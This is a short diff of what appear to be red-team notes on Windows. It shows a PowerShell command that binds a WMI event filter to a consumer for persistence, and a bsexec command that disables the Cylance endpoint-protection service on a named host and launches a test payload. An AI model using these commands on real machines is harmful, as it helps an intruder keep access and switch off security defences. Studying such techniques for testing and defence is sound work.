@@ -9,6 +9,6 @@ WMI Call:
 
     set-wmiinstance -class __filtertoconsumerbinding -namespace "root\subscription" -arguments @{filter = $wmievent; consumer = $wmiconsumer}
     
-After reboot, can use bsexec: https://github.com/gfsmithak/grant-test/blob/master/C%20Practice/BSEXEC
+bsexec works without app control enabled ( as does psexec): https://github.com/gfsmithak/grant-test/blob/master/C%20Practice/BSEXEC
 
 bsexec 0 lmjancpw01 "cmd.exe /c sc config cylancesvc start= disabled" testpayload5
